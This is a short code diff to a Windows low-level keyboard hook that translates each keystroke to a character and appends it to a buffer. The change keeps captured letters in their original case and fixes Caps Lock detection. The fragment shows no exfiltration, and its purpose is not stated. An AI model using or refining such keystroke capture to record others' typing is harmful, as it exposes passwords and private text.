@@ -263,10 +263,10 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
             if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
                 keyboardState[VK_CONTROL] |= 0x80;
             }
-            if (GetAsyncKeyState(VK_MENU) & 0x8000) {    // Alt Key
+            if (GetAsyncKeyState(VK_MENU) & 0x8000) {    // Alt Key     
                 keyboardState[VK_MENU] |= 0x80;
             }
-            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) { // Capslock
+            if (GetKeyState(VK_CAPITAL)) { // Capslock
                 keyboardState[VK_CAPITAL] |= 0x01;
             }
 
@@ -278,7 +278,7 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
             int result           = ToUnicode(p->vkCode, scanCode, keyboardState, unicodeChar, 4, 0);
 
             if (unicodeChar[0] != 8 && unicodeChar[0] != 0) { // If character is not backspace
-                keyBuffer += towlower(unicodeChar[0]); // Otherwise proceed as normal
+                keyBuffer += (unicodeChar[0]); // Otherwise proceed as normal
 
                 // TO-DO: make a switch-case statement for every special key or fix it in a better way
 
